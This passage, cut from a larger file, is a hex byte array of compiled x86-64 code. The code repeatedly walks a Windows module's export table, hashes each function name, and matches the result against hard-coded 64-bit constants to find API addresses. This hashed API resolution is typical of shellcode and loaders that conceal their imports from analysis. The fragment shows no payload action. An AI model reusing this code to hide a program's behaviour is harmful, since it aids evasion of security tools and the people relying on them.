	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x13, 0xBA, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xF9,
	0xB9, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xDF, 0xB9, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xC5, 0xB9, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x82, 0xB9,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xED, 0x29, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xE5, 0x33, 0x2F, 0xEB, 0xB7, 0x41,
	0x19, 0xB6, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x38, 0xB9, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x14,
	0xB9, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xCD, 0x64, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x06, 0xB9, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xFF, 0xB8, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xEA, 0xB8, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xC3, 0xB8, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xA9,
	0xB8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x8F, 0xB8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x75, 0xB8, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x32, 0xB8,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x9D, 0x28, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x1F, 0xF9, 0x90, 0xD2, 0x3A, 0x34,
	0x56, 0xB4, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xE8, 0xB7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xC4,
	0xB7, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x7D, 0x63, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xB6, 0xB7, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xAF, 0xB7, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x9A, 0xB7, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x73, 0xB7, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x59,
	0xB7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x3F, 0xB7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x25, 0xB7, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xE2, 0xB6,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x4D, 0x27, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x6F, 0xB2, 0x63, 0xBE, 0x6A, 0xC2,
	0x2A, 0xA1, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x98, 0xB6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x74,
	0xB6, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x2D, 0x62, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x66, 0xB6, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x5F, 0xB6, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x4A, 0xB6, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x23, 0xB6, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x09,
	0xB6, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xEF, 0xB5, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xD5, 0xB5, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x92, 0xB5,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xFD, 0x25, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x59, 0xDF, 0x16, 0x45, 0x5A, 0x86,
	0x78, 0x9E, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x48, 0xB5, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x24,
	0xB5, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xDD, 0x60, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x16, 0xB5, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x0F, 0xB5, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xFA, 0xB4, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xD3, 0xB4, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xB9,
	0xB4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x9F, 0xB4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x85, 0xB4, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x42, 0xB4,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xAD, 0x24, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x9F, 0xAC, 0x10, 0xCE, 0xF6, 0x66,
	0x34, 0x9B, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xF8, 0xB3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xD4,
	0xB3, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x8D, 0x5F, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xC6, 0xB3, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xBF, 0xB3, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xAA, 0xB3, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x83, 0xB3, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x69,
	0xB3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0x4F, 0xB3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x35, 0xB3, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xF2, 0xB2,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x5D, 0x23, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x51, 0x5A, 0x91, 0x2F, 0xE7, 0xC5,
	0xA3, 0xF9, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0xA8, 0xB2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x84,
	0xB2, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x3D, 0x5E, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x76, 0xB2, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0xB2, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x5A, 0xB2, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x33, 0xB2, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x19,
	0xB2, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xFF, 0xB1, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0xE5, 0xB1, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0xA2, 0xB1,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x0D, 0x22, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0xAD, 0x38, 0xBA, 0x4C, 0x2A, 0xF9,
	0xE9, 0x97, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x58, 0xB1, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0x34,
	0xB1, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0xED, 0x5C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x26, 0xB1, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1F, 0xB1, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0x0A, 0xB1, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xE3, 0xB0, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0xC9,
	0xB0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x20, 0x48, 0x8B,
	0x0D, 0xAF, 0xB0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x24,
	0x48, 0x8B, 0x0D, 0x95, 0xB0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x18, 0x39, 0x44,
	0x24, 0x20, 0x73, 0x6D, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x8B, 0x4C, 0x24, 0x40, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D, 0x52, 0xB0,
	0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0xBD, 0x20, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x48, 0xB8, 0x37, 0x8A, 0x9B, 0x0B, 0xD9, 0x54,
	0xDF, 0x8C, 0x48, 0x39, 0x44, 0x24, 0x50, 0x75, 0x27, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x0F, 0xB7, 0x04,
	0x41, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x8B, 0x04, 0x81, 0x48, 0x8B, 0x0D,
	0x08, 0xB0, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0xEB, 0x08,
	0xE9, 0x7B, 0xFF, 0xFF, 0xFF, 0xCC, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x83, 0x3D, 0xE4,
	0xAF, 0x00, 0x00, 0x00, 0x75, 0x0C, 0xE8, 0x9D, 0x5B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xD6, 0xAF, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xCF, 0xAF, 0x00,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x63, 0x40, 0x3C, 0x48, 0x8B, 0x0D, 0xBA, 0xAF, 0x00, 0x00, 0x48, 0x03,
	0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B,
	0x84, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x93, 0xAF, 0x00,
	0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x0D, 0x79,
	0xAF, 0x00, 0x00, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44,
